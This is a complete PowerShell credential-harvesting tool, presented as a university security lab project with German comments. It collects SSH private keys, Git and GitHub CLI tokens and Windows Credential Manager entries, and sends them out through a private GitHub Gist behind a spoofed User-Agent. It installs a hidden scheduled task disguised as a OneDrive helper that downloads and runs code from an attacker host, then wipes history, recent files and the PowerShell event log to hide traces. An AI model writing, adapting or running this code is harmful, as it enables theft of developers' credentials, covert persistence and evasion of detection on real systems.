# ============================================================
#  "DevRecon" – Multi-Stage Developer Credential Harvester
#  Autoren: Raphael Bleier, Joachim Lugger
#  System Security Lab SS2026 – AAU Klagenfurt
#
#  Ablauf:
#    1. Recon  – SSH-Keys, Git-Credentials, GitHub-CLI Token
#    2. Exfil  – Privates GitHub Gist (HTTPS → nie geblockt)
#    3. Persist – Versteckter Scheduled Task
#    4. OPSEC  – PS-History, Temp-Dateien, Recent Files löschen
#
#  Voraussetzung: GitHub Personal Access Token mit "gist"-Scope
#  Ersetze GITHUB_PAT und ATTACKER_URL!
# ============================================================

$GITHUB_PAT   = "GITHUB_PAT_HERE"        # PAT mit gist-Scope
$ATTACKER_URL = "http://ATTACKER_IP:8080/payload.ps1"  # für Persistenz

# ── PHASE 1: RECON ──────────────────────────────────────────

$report = [System.Text.StringBuilder]::new()
$null = $report.AppendLine("=== DevRecon Report | $(Get-Date -Format 'yyyy-MM-dd HH:mm') ===")
$null = $report.AppendLine("Host : $env:COMPUTERNAME | User: $env:USERNAME | OS: $((Get-WmiObject Win32_OperatingSystem).Caption)")
$null = $report.AppendLine("")

# 1a) SSH Private Keys (~/.ssh)
$null = $report.AppendLine("── SSH PRIVATE KEYS ──────────────────────────────────────")
$sshDir = Join-Path $env:USERPROFILE ".ssh"
if (Test-Path $sshDir) {
    # Private Key Dateien: id_rsa, id_ed25519, id_ecdsa, id_dsa, config
    Get-ChildItem $sshDir -File | ForEach-Object {
        $null = $report.AppendLine("[ $($_.Name) ]")
        $null = $report.AppendLine((Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue))
        $null = $report.AppendLine("")
    }
} else {
    $null = $report.AppendLine("(kein .ssh Verzeichnis gefunden)")
}

# 1b) Git Credential Store – enthält GitHub-Tokens im Klartext!
# Datei: ~/.git-credentials  Format: https://user:TOKEN@github.com
$null = $report.AppendLine("── GIT CREDENTIALS (.git-credentials) ────────────────────")
$gitCreds = Join-Path $env:USERPROFILE ".git-credentials"
if (Test-Path $gitCreds) {
    $null = $report.AppendLine((Get-Content $gitCreds -Raw))
} else {
    $null = $report.AppendLine("(keine .git-credentials Datei gefunden)")
}

# 1c) .gitconfig – Name, E-Mail, Credential Helper, Aliase
$null = $report.AppendLine("── .GITCONFIG ─────────────────────────────────────────────")
$gitConfig = Join-Path $env:USERPROFILE ".gitconfig"
if (Test-Path $gitConfig) {
    $null = $report.AppendLine((Get-Content $gitConfig -Raw))
} else {
    $null = $report.AppendLine("(keine .gitconfig gefunden)")
}

# 1d) GitHub CLI Token (gh auth) – gespeichert in hosts.yml
# Enthält den OAuth-Token für die GitHub API!
$null = $report.AppendLine("── GITHUB CLI TOKEN (hosts.yml) ───────────────────────────")
$ghHosts = Join-Path $env:APPDATA "GitHub CLI\hosts.yml"
if (-not (Test-Path $ghHosts)) {
    # Alternativer Pfad (neuere gh-Versionen)
    $ghHosts = Join-Path $env:LOCALAPPDATA "GitHub\hosts.yml"
}
if (Test-Path $ghHosts) {
    $null = $report.AppendLine((Get-Content $ghHosts -Raw))
} else {
    $null = $report.AppendLine("(kein GitHub CLI Token gefunden)")
}

# 1e) Windows Credential Manager – gespeicherte Git-Credentials
$null = $report.AppendLine("── WINDOWS CREDENTIAL MANAGER (git) ──────────────────────")
$cmdkeyOutput = cmdkey /list 2>&1 | Where-Object { $_ -match "git|github" } | Out-String
$null = $report.AppendLine($cmdkeyOutput)

# ── PHASE 2: EXFILTRATION via GitHub Gist ───────────────────
# Privates Gist: nur der Eigentümer des PAT kann es sehen.
# Traffic geht über api.github.com:443 → sieht aus wie normales
# GitHub-Browsing, wird von praktisch keiner Firewall geblockt.

$gistBody = @{
    description = "sync_backup_$(Get-Date -Format 'yyyyMMdd_HHmm')"
    public      = $false
    files       = @{
        "report.txt" = @{ content = $report.ToString() }
    }
} | ConvertTo-Json -Depth 5

$headers = @{
    "Authorization" = "token $GITHUB_PAT"
    "Content-Type"  = "application/json"
    "User-Agent"    = "git/2.40.0"    # User-Agent tarnen als normaler git-Client
}

try {
    $response = Invoke-RestMethod -Uri "https://api.github.com/gists" `
        -Method POST -Headers $headers -Body $gistBody
    $gistUrl = $response.html_url
} catch {
    # Stilles Scheitern – kein Fehler beim Opfer sichtbar
    $gistUrl = "exfil_failed"
}

# ── PHASE 3: PERSISTENZ – Scheduled Task ────────────────────
# Task-Name: unauffällig, klingt nach Windows-Systemdienst
$taskName = "OneDrive Sync Helper"

# Prüfen ob Task schon existiert (Idempotenz)
if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
    $action = New-ScheduledTaskAction `
        -Execute "powershell.exe" `
        -Argument "-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -Command `"IEX (New-Object Net.WebClient).DownloadString('$ATTACKER_URL')`""

    # Jeden Montag um 09:15 – Zeitpunkt wenn Mitarbeiter üblicherweise im Büro
    $trigger  = New-ScheduledTaskTrigger -Weekly -DaysOfWeek Monday -At "09:15"
    $settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit (New-TimeSpan -Minutes 2)
    $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Limited

    Register-ScheduledTask `
        -TaskName  $taskName `
        -Action    $action `
        -Trigger   $trigger `
        -Settings  $settings `
        -Principal $principal `
        -ErrorAction SilentlyContinue | Out-Null
}

# ── PHASE 4: OPSEC – Spuren verwischen ──────────────────────

# PowerShell Befehlshistorie löschen (PSReadLine-Datei)
$histFile = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath
if ($histFile -and (Test-Path $histFile)) {
    Remove-Item $histFile -Force -ErrorAction SilentlyContinue
}

# Session-History im Speicher leeren
[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
Clear-History

# Zuletzt verwendete Dateien (Recent Files) clearen
Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -Recurse -ErrorAction SilentlyContinue

# Temporäre XML-Dateien (z.B. von netsh-Export) entfernen
Remove-Item "$env:TEMP\*.xml" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\*.txt" -Force -ErrorAction SilentlyContinue

# PowerShell Event Log für diese Session leeren (braucht keine Admin-Rechte für eigene Session)
# Hinweis: vollständiges Log-Löschen (wevtutil) braucht Admin → weglassen für Standard-User-OPSEC
[System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog("Windows PowerShell") 2>$null
